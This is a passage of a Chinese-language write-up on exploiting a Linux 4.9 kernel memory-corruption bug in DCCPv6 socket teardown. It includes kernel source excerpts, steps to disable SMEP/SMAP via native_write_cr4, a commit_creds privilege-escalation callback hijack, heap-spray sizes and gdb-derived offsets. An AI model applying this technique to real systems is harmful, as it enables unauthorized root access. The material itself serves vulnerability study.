[inet6_destroy_sock()](https://elixir.bootlin.com/linux/v4.9.12/source/net/ipv6/af_inet6.c#L426)
->
[kfree_skb()](https://elixir.bootlin.com/linux/v4.9.12/source/net/core/skbuff.c#L696)
->
[__kfree_skb()](https://elixir.bootlin.com/linux/v4.9.12/source/net/core/skbuff.c#L684)
->
[skb_release_all()](https://elixir.bootlin.com/linux/v4.9.12/source/net/core/skbuff.c#L670)
->
[skb_release_data()](https://elixir.bootlin.com/linux/v4.9.12/source/net/core/skbuff.c#L583)
    static struct proto dccp_v6_prot = {
        .name           = "DCCPv6",
        .owner           = THIS_MODULE,
        .close           = dccp_close,                // close(socket) -> dccp_close() ->  ...  ->      sk->sk_prot->destroy(sk)
        ... ...
        .destroy       = dccp_v6_destroy_sock,
        ...    ...
    };
    static void skb_release_data(struct sk_buff *skb)
    {
        struct skb_shared_info *shinfo = skb_shinfo(skb);            // skb_shared_info 在 sk_buff中线性数据区的偏移: skb->head+skb->end
        int i;
        if (skb->cloned &&
            atomic_sub_return(skb->nohdr ? (1 dataref))
            return;
        for (i = 0; i nr_frags; i++)
            __skb_frag_unref(&shinfo->frags[i]);
        /*
         * If skb buf is from userspace, we need to notify the caller
         * the lower device DMA has done;
         */
        if (shinfo->tx_flags & SKBTX_DEV_ZEROCOPY) {
            struct ubuf_info *uarg;
            uarg = shinfo->destructor_arg;
            if (uarg->callback)                                                                    // 执行回调函数
                uarg->callback(uarg, true);
        }
        if (shinfo->frag_list)
            kfree_skb_list(shinfo->frag_list);
        skb_free_head(skb);
    }
    #define skb_shinfo(SKB)    ((struct skb_shared_info *)(skb_end_pointer(SKB)))
    static inline unsigned char *skb_end_pointer(const struct sk_buff *skb)
    {
        return skb->head + skb->end;
    }
####  2-2. 关闭SMEP/SMAP
**思路**
：参考CVE-2016-8655的利用方法，调用`native_write_cr4(0x406e0)`来关闭SMEP/SMAP。如果采用以上触发方法来劫持`skb->
...
->destructor_arg->callback`函数，则无法传递参数`0x406e0`。所以借鉴CVE-2016-8655的利用方法，劫持回调函数
[packet_sock](https://elixir.bootlin.com/linux/v4.8.12/source/net/packet/internal.h#L103)
—> [struct packet_ring_buffer
rx_ring](https://elixir.bootlin.com/linux/v4.9.12/source/net/packet/internal.h#L56)
—> [struct tpacket_kbdq_core
prb_bdqc](https://elixir.bootlin.com/linux/v4.9.12/source/net/packet/internal.h#L14)
—> [struct timer_list
retire_blk_timer](https://elixir.bootlin.com/linux/v4.9.12/source/include/linux/timer.h#L12)
—> `function`
**结构链** （伪造`timer_list`结构）：
    struct packet_sock {
        /* struct sock has to be the first member of packet_sock */
        struct sock        sk;
        struct packet_fanout    *fanout;
        union  tpacket_stats_u    stats;
        struct packet_ring_buffer    rx_ring;                    // [init_prb_bdqc()](https://elixir.bootlin.com/linux/v4.9.12/source/net/packet/af_packet.c#L603)->[prb_setup_retire_blk_timer()](https://elixir.bootlin.com/linux/v4.9.12/source/net/packet/af_packet.c#L547)->[prb_init_blk_timer()](https://elixir.bootlin.com/linux/v4.9.12/source/net/packet/af_packet.c#L537)
**注销timer调用链** ：`close(fd);` ——
[packet_release()](https://elixir.bootlin.com/linux/v4.9.12/source/net/packet/af_packet.c#L2964)
->
[packet_set_ring()](https://elixir.bootlin.com/linux/v4.9.12/source/net/packet/af_packet.c#L4161)->[prb_shutdown_retire_blk_timer()](https://elixir.bootlin.com/linux/v4.9.12/source/net/packet/af_packet.c#L523)
->
[prb_del_retire_blk_timer()](https://elixir.bootlin.com/linux/v4.9.12/source/net/packet/af_packet.c#L518)
->
[del_timer_sync()](https://elixir.bootlin.com/linux/v4.9.12/source/kernel/time/timer.c#L1254)
####  2-3. 完整利用
**利用步骤** ：
  * （1）第一次触发漏洞，伪造函数指针 `po->rx_ring->prb_bdqc->retire_blk_timer->function`，指向`native_write_cr4()`函数，伪造参数 `po->rx_ring->prb_bdqc->retire_blk_timer->data` 为 0x406e0，关闭SMEP/SMAP保护；
  * （2）第二次触发漏洞，伪造函数指针 `skb-> ... ->destructor_arg->callback`，指向 `commit_creds(prepare_kernel_cred(0))` 函数，提权；
  * （3）如果能读取特权文件，表示提权成功，fork子进程弹shell，避免直接弹shell时释放sk_buff导致崩溃。
**堆喷射**
：注意，关闭SMEP/SMAP时喷射覆盖的是`packet_sock`对象，大小为0x580；提权时喷射覆盖的是`sk_buff`指向的数据区和`skb_shared_info`结构所在的堆块，大小为0x800。这两个对象都位于0x800大小的堆块中，所以exp中发送的占位数据大小是1536，也就是0x600，对齐后大小为0x800。关于`sk_buff`对象的知识可以参考第3节，了解`sk_buff`结构和`skb_shared_info`结构的空间排布关系。
**修正偏移** ：
    # 1. timer offset                ---> 偏移为 0x2e8+0x30+104
    gef➤  p/x &(*(struct packet_sock*)0)->rx_ring
    $3 = 0x2e8                    =744
    gef➤  p/x &(*(struct packet_ring_buffer*)0)->prb_bdqc
    $4 = 0x30
    gef➤  p/x &(*(struct tpacket_kbdq_core*)0)->retire_blk_timer
    $5 = 0x68                    =104
    # 2. skb_shared_info offset        ---> 偏移为 0x6c0
    /exp $ cat /tmp/kallsyms | grep skb_release_data
    ffffffff81783260 t skb_release_data
    gef➤  x /30i 0xffffffff81783260
       0xffffffff81783260 :    nop    DWORD PTR [rax+rax*1+0x0]
       0xffffffff81783265 :    push   rbp
       0xffffffff81783266 :    mov    rbp,rsp
       0xffffffff81783269 :    push   r14
       0xffffffff8178326b :    push   r13
       0xffffffff8178326d :    push   r12
       0xffffffff8178326f :    push   rbx
    => 0xffffffff81783270 :    movzx  eax,BYTE PTR [rdi+0x8e]
       0xffffffff81783277 :    mov    r14d,DWORD PTR [rdi+0xcc]
       0xffffffff8178327e :    add    r14,QWORD PTR [rdi+0xd0]
       0xffffffff81783285 :    test   al,0x1
       0xffffffff81783287 :    je     0xffffffff817832af 
    gef➤  p skb
    $1 = (struct sk_buff *) 0xffff88007fa5f200
    gef➤  p *(struct sk_buff *) 0xffff88007fa5f200
      tail = 0x4ac,
      end = 0x6c0,
      head = 0xffff88007a890800 "",
      data = 0xffff88007a890c78
**提权成功** ：
* * *
## 3\. sk_buff 扩展学习
**目的** ：了解`sk_buff`结构和`skb_shared_info`结构的空间排布关系。
####  3-1. sk_buff 结构
**`sk_buff`结构体**：sk_buff结构体关联多个其他结构体，第一是线性数据区，由`sk_buff->head`和`sk_buff->end`指向的数据块，用来存储sk_buff结构的数据也即是存储数据包的内容和各层协议头。第二是分片结构，也即
**`skb_shared_info`结构，跟在线性数据区后面，即是end指针的下一个字节开始就是分片结构**，用来表示IP分片的一个结构体。因此，`skb_shared_info`分片结构和sk_buff的线性数据区内存分配及销毁时都是一起的。第三个是分片结构指向的非线性数据区，即是IP分片内容。
    struct sk_buff {
        union {
            struct {
                /* These two members must be first. */
                struct sk_buff        *next;        // sk_buff结构体是双链表, 指向下一个sk_buff结构体
                struct sk_buff        *prev;        // 指向前一个sk_buff结构体
                union {
                    ktime_t        tstamp;            // 时间戳，表示这个skb的接收到的时间，一般是在包从驱动中往二层发送的接口函数中设置
                    struct skb_mstamp skb_mstamp;
                };
            };
            struct rb_node    rbnode; /* used in netem & tcp stack */
        };
        struct sock        *sk;                    // 指向拥有此缓冲的套接字sock结构体，即：宿主传输控制模块
        struct net_device    *dev;                // 表示一个网络设备，当skb为输出/输入时，dev表示要输出/输入到的设备